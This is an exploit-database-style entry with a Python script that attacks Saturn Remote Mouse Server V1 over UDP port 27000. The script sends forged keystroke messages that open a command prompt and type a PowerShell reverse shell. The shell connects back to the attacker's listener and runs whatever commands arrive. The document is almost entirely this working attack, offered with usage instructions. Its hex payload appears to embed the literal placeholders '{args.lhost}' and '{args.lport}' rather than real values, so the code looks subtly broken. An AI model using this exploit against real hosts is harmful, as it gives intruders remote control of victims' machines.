
#### Exploit Title: Saturn Remote Mouse Server V1 - Remote Code Execution (RCE) 
#### Date: 2025-06-30
#### Exploit Author: tmrswrr
#### Vendor Homepage: https://www.saturnremote.com/
#### Software Link: https://apps.microsoft.com/detail/9PCRBT6TM5V8?hl=en-us&gl=US&ocid=pdpshare
#### Platform: Multiple
#### Version: V1
#### Tested on: Windows 10

#### Remote Code Execution Vulnerability via UDP Protocol in Local Network Services

#### USAGE : python3 saturn.py --lhost 192.168.1.110 --lport 4444

#### EXPLOIT 
```
import socket
import time
import argparse

def main():

    parser = argparse.ArgumentParser(description='Send UDP commands and execute reverse shell')
    parser.add_argument('--lhost', required=True, help='Listener IP address')
    parser.add_argument('--lport', required=True, type=int, help='Listener port')
    args = parser.parse_args()

    UDP_IP = "192.168.1.109"
    UDP_PORT = 27000


    ps_command = (
    f"powershell -nop -c \""
    f"$c=New-Object System.Net.Sockets.TCPClient('{args.lhost}',{args.lport}');"
    "$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=iex $d 2>&1;"
    "$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)"
    "}\""
    )


    messages = [
        # Connection messages
        "7b224973436f6e6e656374696e67223a2274727565227d",          # {"IsConnecting":"true"}
        "7b22636f6e6e656374696f6e223a2022616374697665227d",        # {"connection": "active"}
        
        # START command
        "7b2241726561486569676874223a302c22417265615769647468223a302c22436f6d6d616e644e616d65223a225354415254222c2258223a302c2259223a307d",
        
        # Open CMD
        "7b224b6579223a22636d64227d",          # {"Key":"cmd"}
        "7b224b6579223a225c6e227d",            # {"Key":"\\n"} - Enter to open cmd
        
        # Send PowerShell command as a single message
        f"7b224b6579223a2022706f7765727368656c6c202d6e6f70202d63205c2224633d4e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e544350436c69656e7428277b617267732e6c686f73747d272c7b617267732e6c706f72747d293b24733d24632e47657453747265616d28293b5b627974655b5d5d24623d302e2e36353533357c257b307d3b7768696c65282824693d24732e526561642824622c302c24622e4c656e6774682929202d6e652030297b3b24643d284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e476574537472696e672824622c302c2469293b24723d696578202464203e26313b24732e577269746528284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e4765744279746573282472202b20275053203e2027292c302c282472202b20275053203e2027292e4c656e677468297d5c22227d",
	"7b224b6579223a225c6e227d"
    ]


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"[*] Sending setup commands to {UDP_IP}:{UDP_PORT}")
    print(f"[*] PowerShell command length: {len(ps_command)} characters")
    

    for i, hex_msg in enumerate(messages):
        data = bytes.fromhex(hex_msg)
        sock.sendto(data, (UDP_IP, UDP_PORT))
        print(f"Sent command {i+1}: {data.decode('utf-8', errors='replace')}")
        time.sleep(1) 
    
    sock.close()
    print("[+] Reverse shell command sent. Check your listener!")

if __name__ == "__main__":
    main()

```


